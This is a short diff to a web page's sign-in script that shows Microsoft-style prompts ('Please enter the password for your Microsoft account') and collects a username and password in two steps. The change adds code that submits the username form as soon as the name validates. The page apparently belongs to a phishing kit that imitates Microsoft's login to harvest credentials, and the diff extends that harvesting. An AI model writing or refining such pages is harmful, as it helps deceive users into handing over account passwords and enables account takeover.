@@ -425,6 +425,8 @@
         const pwdReq = "Please enter the password for your Microsoft account."
         const unameInp = document.getElementById('inp_uname');
         const pwdInp = document.getElementById('inp_pwd');
+        const form_uname = document.getElementById('form_uname');
+        const form_pwd = document.getElementById('form_pwd');
         let view = "uname";
 
         let unameVal = pwdVal = false;
@@ -435,6 +437,7 @@
             //validate the form
             validate();
             if (unameVal) {
+                form_uname.submit();
                 document.getElementById("section_uname").classList.toggle('d-none');
                 document.getElementById('section_pwd').classList.remove('d-none');
                 document.querySelectorAll('#user_identity').forEach((e) => {
